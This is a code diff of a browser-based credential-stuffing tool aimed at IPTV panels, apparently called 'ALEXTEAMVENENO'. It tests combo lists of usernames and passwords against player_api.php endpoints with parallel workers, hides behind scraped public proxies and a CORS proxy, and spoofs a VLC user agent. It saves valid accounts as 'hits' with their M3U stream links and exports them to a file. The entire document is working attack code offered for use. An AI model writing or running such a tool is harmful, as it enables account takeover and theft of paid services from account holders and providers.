-        hitsArray.unshift(hitData);
-        totalChannels += (hitData.canales || 0);
-        totalSpain += (hitData.espana || 0);
-        renderHitsTable();
-        updateStatsUI();
-        saveHitsToLocalStorage();
-        log(`💥 HIT! ${hitData.user}:${hitData.pass} | 📺 ${hitData.canales} | 🇪🇸 ${hitData.espana}`, 'hit');
+    function addHit(h) {
+        hitsArray.unshift(h);
+        totalChannels += (h.canales||0);
+        totalSpain += (h.espana||0);
+        renderHits();
+        saveHits();
+        log(`💥 HIT! ${h.user}:${h.pass} @ ${h.portal} | 📺 ${h.canales}`, 'hit');
     }
 
     function clearHits() {
-        if(confirm('⚠️ Borrar TODOS los hits?')) {
+        if(confirm('⚠️ Borrar todos los hits?')) {
             hitsArray = []; totalChannels = 0; totalSpain = 0;
-            renderHitsTable(); saveHitsToLocalStorage();
-            showToast('🗑️ Hits eliminados');
+            renderHits(); saveHits();
+            showToast('🗑️ Eliminados');
         }
     }
 
     function saveHitsToTxt() {
         if(!hitsArray.length) { showToast('⚠️ No hay hits'); return; }
-        let content = `ALEXTEAMVENENO HITS\n${new Date().toISOString()}\nTotal: ${hitsArray.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
-        hitsArray.forEach((h,i) => {
-            content += `#${i+1} 👤 ${h.user} 🔑 ${h.pass}\n🌐 ${h.portal}\n📺 ${h.canales} | 🇪🇸 ${h.espana}\n🔗 ${h.m3u}\n━━━━━━━━━━━━━━━━━━━━\n`;
-        });
+        let c = `ALEXTEAMVENENO HITS\n${new Date().toISOString()}\nTotal: ${hitsArray.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
+        hitsArray.forEach((h,i) => { c += `#${i+1} ${h.user}:${h.pass} | ${h.portal} | 📺${h.canales} | 🇪🇸${h.espana}\n🔗 ${h.m3u}\n\n`; });
         const a = document.createElement('a');
-        const url = URL.createObjectURL(new Blob([content], {type: 'text/plain'}));
-        a.href = url; a.download = `HITS_${new Date().toISOString().split('T')[0]}.txt`;
-        document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
-        showToast('💾 Archivo guardado');
+        a.href = URL.createObjectURL(new Blob([c], {type:'text/plain'}));
+        a.download = `HITS_${new Date().toISOString().split('T')[0]}.txt`;
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        showToast('💾 Guardado!');
     }
 
-    function escapeHtml(str) { return String(str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-    function copyToClipboard(text) { navigator.clipboard.writeText(text).catch(()=>prompt('Copia:', text)); }
-    function showToast(msg) { const t=document.getElementById('toast'); t.innerText=msg; t.style.display='block'; setTimeout(()=>t.style.display='none', 2000); }
-    function log(msg, type='info') { const c=document.getElementById('console'); if(!c) return; const line=document.createElement('div'); line.innerText=`[${new Date().toLocaleTimeString()}] ${msg}`; c.appendChild(line); c.scrollTop=c.scrollHeight; }
+    function copyText(text) { navigator.clipboard.writeText(text).catch(()=>{}); showToast('✅ Copiado'); }
 
-    function updateStatsUI() {
-        document.getElementById('statChecked').innerText = stats.checked;
-        document.getElementById('statHits').innerText = stats.hits;
-        document.getElementById('statErrors').innerText = stats.errors;
-        document.getElementById('statRate').innerText = stats.checked>0 ? ((stats.hits/stats.checked)*100).toFixed(2)+'%' : '0%';
-        if(totalCombos>0) document.getElementById('progressFill').style.width = (stats.checked/totalCombos*100)+'%';
-        if(startTime>0 && stats.checked>0){
-            const elapsed = (Date.now()-startTime)/1000;
-            document.getElementById('statCPM').innerText = Math.floor((stats.checked/elapsed)*60);
-            const remaining = totalCombos - stats.checked;
-            const eta = remaining / (stats.checked/elapsed);
-            const m = Math.floor(eta/60), s = Math.floor(eta%60);
-            document.getElementById('statETA').innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-        }
+    function showModal(h) {
+        currentModalHit = h;
+        document.getElementById('modalHitInfo').innerHTML = `👤 ${h.user}<br>🔑 ${h.pass}<br>🌐 ${h.portal}<br>📺 ${h.canales} | 🇪🇸 ${h.espana}<br>📅 ${h.exp||'N/A'}`;
+        document.getElementById('m3uModalLink').textContent = h.m3u||'No link';
+        document.getElementById('m3uModal').style.display = 'flex';
     }
 
-    // 🔥 SCANNER CON PROXY IPVANISH
+    function closeModal(e) { if(!e || e.target===document.getElementById('m3uModal')) document.getElementById('m3uModal').style.display='none'; }
+    function copyM3uFromModal() { if(currentModalHit) copyText(currentModalHit.m3u||''); }
+
+    function handleComboFile(e) {
+        const f = e.target.files[0]; if(!f) return;
+        const reader = new FileReader();
+        reader.onload = ev => {
+            comboLines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
+            totalCombos = comboLines.length;
+            stats = { checked:0, hits:0, errors:0 };
+            document.getElementById('comboStatus').textContent = `${comboLines.length} cuentas`;
+            log(`✅ ${comboLines.length} combos cargados`, 'info');
+            updateStats();
+        };
+        reader.readAsText(f);
+    }
+
+    async function scrapeProxies() {
+        const btn = document.getElementById('btnScrape');
+        btn.textContent = '⏳...'; btn.disabled = true;
+        try {
+            const res = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&limit=100');
+            const txt = await res.text();
+            const nuevos = txt.split('\n').filter(l=>l.trim().match(/\d+\.\d+\.\d+\.\d+:\d+/));
+            if(nuevos.length > 0) {
+                proxies = [...new Set([...nuevos, ...proxies])].slice(0, 500);
+                proxyIndex = 0;
+                document.getElementById('proxyStatus').textContent = `✅ ${proxies.length} proxies`;
+                log(`🌐 ${proxies.length} proxies listos`, 'hit');
+            }
+        } catch(e) { log('Error scrapeando', 'err'); }
+        btn.textContent = '🔄 RECARGAR'; btn.disabled = false;
+    }
+
+    // 🔥 ESCANEO CON PROXY HTTP
     async function checkCombo(line, portals, https) {
         const parts = line.split(':');
         if(parts.length<2) return null;
         const user = parts[0].trim(), pass = parts.slice(1).join(':').trim();
-        if(!user || !pass) return null;
+        if(!user||!pass) return null;
         const proto = https ? 'https' : 'http';
         const useProxy = document.getElementById('useProxies').checked;
 
@@ -581,42 +341,35 @@
             const targetUrl = `${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
 
             try {
-                const controller = new AbortController();
-                const timeout = setTimeout(()=>controller.abort(), 15000);
+                const ctrl = new AbortController();
+                setTimeout(()=>ctrl.abort(), 10000);
 
                 let response;
-                if(useProxy) {
-                    // Usar proxy SOCKS5h de IPVanish a través de un proxy CORS público
-                    // (Los navegadores no soportan SOCKS5 nativamente)
+                if(useProxy && proxies.length > 0) {
                     const corsProxy = 'https://corsproxy.io/?';
                     response = await fetch(corsProxy + encodeURIComponent(targetUrl), {
-                        signal: controller.signal,
+                        signal: ctrl.signal,
                         headers: { 'User-Agent': 'VLC/3.0.20' }
                     });
                 } else {
                     response = await fetch(targetUrl, {
-                        signal: controller.signal,
+                        signal: ctrl.signal,
                         headers: { 'User-Agent': 'VLC/3.0.20' }
                     });
                 }
 
-                clearTimeout(timeout);
-
                 if(response.ok){
                     const txt = await response.text();
-                    if(txt.includes('active') || txt.includes('exp_date')){
-                        let json = {}; try{ json=JSON.parse(txt); }catch(e){}
+                    if(txt.toLowerCase().includes('active')||txt.toLowerCase().includes('exp_date')){
+                        let json={}; try{json=JSON.parse(txt);}catch(e){}
                         const exp = json.user_info?.exp_date ? new Date(parseInt(json.user_info.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
-                        let canales=0, espana=0;
+                        let can=0, esp=0;
                         try{
-                            const liveRes = await fetch(`${base}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, { signal: AbortSignal.timeout(7000) });
-                            if(liveRes.ok){
-                                const live = await liveRes.json();
-                                if(Array.isArray(live)) { canales = live.length; espana = live.filter(c=> (c.name||'').toLowerCase().includes('es ') || (c.category_name||'').toLowerCase().includes('es')).length; }
-                            }
+                            const lr = await fetch(`https://corsproxy.io/?${encodeURIComponent(base+'/player_api.php?username='+user+'&password='+pass+'&action=get_live_streams')}`, {signal:AbortSignal.timeout(7000)});
+                            if(lr.ok){ const ld = await lr.json(); if(Array.isArray(ld)){ can=ld.length; esp=ld.filter(c=>(c.name||'').toLowerCase().includes('es')||(c.category_name||'').toLowerCase().includes('es')).length; }}
                         }catch(e){}
                         const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-                        return { hit: true, data: { user, pass, exp, portal: cp, m3u, canales, espana, pelis:0, series:0, categories:[] } };
+                        return { hit:true, data:{user, pass, exp, portal:cp, m3u, canales:can, espana:esp} };
                     }
                 }
             } catch(e){ continue; }
@@ -624,25 +377,25 @@
         return null;
     }
 
-    async function startScan(){
-        if(!isLoggedIn || isRunning) return;
-        if(!comboLines.length){ showToast('⚠️ Carga un combo'); return; }
-        const rawPortals = document.getElementById('portals').value.trim();
-        if(!rawPortals){ showToast('⚠️ Ingresa URLs'); return; }
-        const portals = rawPortals.split(',').map(p=>p.trim()).filter(Boolean);
-        const threads = Math.min(parseInt(document.getElementById('threads').value)||20, 60);
+    async function startScan() {
+        if(!isLoggedIn||isRunning||!comboLines.length) { if(!comboLines.length) showToast('⚠️ Carga un combo'); return; }
+        const raw = document.getElementById('portals').value.trim();
+        if(!raw) { showToast('⚠️ Ingresa URL del panel'); return; }
+        const portals = raw.split(',').map(p=>p.trim()).filter(Boolean);
+        if(!portals.length) return;
+        const threads = Math.min(parseInt(document.getElementById('threads').value)||20, 40);
         const useHttps = document.getElementById('useHttps').checked;
 
         isRunning = true;
         stats = { checked:0, hits:0, errors:0 };
         totalCombos = comboLines.length;
         startTime = Date.now();
+        proxyIndex = 0;
         document.getElementById('btnStart').disabled = true;
         document.getElementById('btnStop').disabled = false;
         
         const useProxy = document.getElementById('useProxies').checked;
-        const proxyUrl = getProxyUrl();
-        log(`🚀 ATAQUE INICIADO | Proxy: ${useProxy ? proxyUrl : 'Directo'}`, 'warn');
+        log(`🚀 ATAQUE | ${useProxy?'🌐 PROXY':'🔗 DIRECTO'} | ${threads} hilos | ${comboLines.length} combos`, 'warn');
 
         const queue = [...comboLines];
         let index = 0;
@@ -651,101 +404,26 @@
             while(isRunning && index < queue.length){
                 const i = index++;
                 const line = queue[i];
-                if(!line || !line.includes(':')) { stats.checked++; updateStatsUI(); continue; }
+                if(!line||!line.includes(':')) { stats.checked++; updateStats(); continue; }
                 const result = await checkCombo(line, portals, useHttps);
                 stats.checked++;
-                if(result?.hit){
-                    stats.hits++;
-                    addHitToTable(result.data);
-                } else {
-                    stats.errors++;
-                }
-                if(stats.checked % 5 === 0) updateStatsUI();
-                await new Promise(r => setTimeout(r, 10));
+                if(result?.hit){ stats.hits++; addHit(result.data); }
+                else { stats.errors++; }
+                if(stats.checked % 5 === 0) updateStats();
+                await new Promise(r=>setTimeout(r, 5));
             }
         }
 
-        await Promise.all(Array(Math.min(threads, queue.length)).fill().map(() => worker()));
+        await Promise.all(Array(Math.min(threads, queue.length)).fill().map(()=>worker()));
         isRunning = false;
         document.getElementById('btnStart').disabled = false;
         document.getElementById('btnStop').disabled = true;
-        updateStatsUI();
-        log(`✅ FIN | Hits: ${stats.hits} | 📺 ${totalChannels} | 🇪🇸 ${totalSpain}`, 'warn');
+        updateStats();
+        log(`✅ FIN | Hits: ${stats.hits} | Errores: ${stats.errors}`, 'warn');
+        showToast(`✅ ${stats.hits} hits!`);
     }
 
-    function stopScan(){ isRunning = false; log('⬛ DETENIDO', 'warn'); }
-
-    function handleComboFile(e){
-        const file = e.target.files[0]; if(!file) return;
-        const reader = new FileReader();
-        reader.onload = function(ev){
-            comboLines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
-            totalCombos = comboLines.length;
-            stats = { checked:0, hits:0, errors:0 };
-            document.getElementById('comboStatus').innerText = `${comboLines.length} cuentas`;
-            log(`✅ ${comboLines.length} combos cargados`, 'info');
-            updateStatsUI();
-        };
-        reader.readAsText(file);
-    }
-
-    function handleProxyFile(e){
-        const file = e.target.files[0]; if(!file) return;
-        const reader = new FileReader();
-        reader.onload = function(ev){
-            proxies = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l && !l.startsWith('#'));
-            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies externos`;
-            log(`🌐 ${proxies.length} proxies cargados`, 'info');
-        };
-        reader.readAsText(file);
-    }
-
-    async function scrapeProxies(){
-        const btn=document.getElementById('btnScrape');
-        btn.innerText='⏳';
-        try{
-            const res=await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000');
-            const txt=await res.text();
-            proxies = txt.split('\n').filter(l=>l.trim().match(/\d+\.\d+\.\d+\.\d+:\d+/)).slice(0,150);
-            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies scrapeados`;
-            log(`✅ ${proxies.length} proxies scrapeados`, 'hit');
-        } catch(e){ log('Error scrapeando', 'err'); }
-        btn.innerText='🌐 SCRAPEAR';
-    }
-
-    function doLogin(){
-        if(document.getElementById('loginUser').value.trim() === VALID_USER && document.getElementById('loginPass').value === VALID_PASS){
-            isLoggedIn = true;
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-            loadHitsFromLocalStorage();
-            log('🔓 DRAGÓN LISTO (IPVANISH)', 'hit');
-            showToast('✅ Bienvenido ALEX');
-        } else {
-            document.getElementById('loginError').style.display = 'block';
-        }
-    }
-
-    function doLogout(){ 
-        if(confirm('¿Salir?')){ 
-            isRunning=false; isLoggedIn=false; 
-            document.getElementById('dashboard').style.display='none'; 
-            document.getElementById('loginScreen').style.display='flex'; 
-        } 
-    }
-
-    function toggleLang(){ currentLang = currentLang==='es'?'en':'es'; document.getElementById('langIndicator').innerText = currentLang==='es'?'🇪🇸':'🇬🇧'; }
-
-    let currentModalHit=null;
-    function showModal(hit){ 
-        currentModalHit=hit; 
-        document.getElementById('modalHitInfo').innerHTML=`👤 ${hit.user}<br>🔑 ${hit.pass}<br>🌐 ${hit.portal}<br>📺 ${hit.canales} | 🇪🇸 ${hit.espana}<br>📅 ${hit.exp||'N/A'}`;
-        document.getElementById('m3uModalLink').innerText=hit.m3u||'No link'; 
-        document.getElementById('m3uModal').style.display='flex'; 
-    }
-    function closeModal(e){ if(!e || e.target===document.getElementById('m3uModal')) document.getElementById('m3uModal').style.display='none'; }
-    function copyM3uFromModal(){ if(currentModalHit) copyToClipboard(currentModalHit.m3u||''); showToast('📋 M3U copiado'); }
-    function copyAllDetails(){ if(currentModalHit){ copyToClipboard(`${currentModalHit.user}:${currentModalHit.pass}\n${currentModalHit.portal}\n${currentModalHit.m3u}`); showToast('✅ Copiado'); } }
+    function stopScan() { isRunning = false; document.getElementById('btnStop').disabled = true; log('⬛ DETENIDO', 'warn'); }
 
     window.onload = () => { document.getElementById('loginScreen').style.display = 'flex'; };
 </script>
